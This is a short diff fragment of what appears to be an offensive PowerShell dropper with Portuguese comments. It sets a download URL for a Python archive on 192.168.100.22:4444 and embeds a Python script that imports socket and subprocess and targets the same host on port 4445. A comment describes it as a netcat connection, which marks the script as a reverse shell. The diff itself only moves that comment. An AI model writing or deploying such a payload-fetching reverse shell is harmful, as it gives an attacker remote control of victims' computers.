@@ -19,13 +19,12 @@ Write-Host " \_/ \_/   \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/"
 $pythonUrl = "http://192.168.100.22:4444/python3.zip"
 
 # Script Python a ser executado
+# conexao do netcat
 $pythonScript = @"
 import socket
 import os
 import sys
 import subprocess
-
-# conexao do netcat
 
 ips = '192.168.100.22'  
 p = 4445
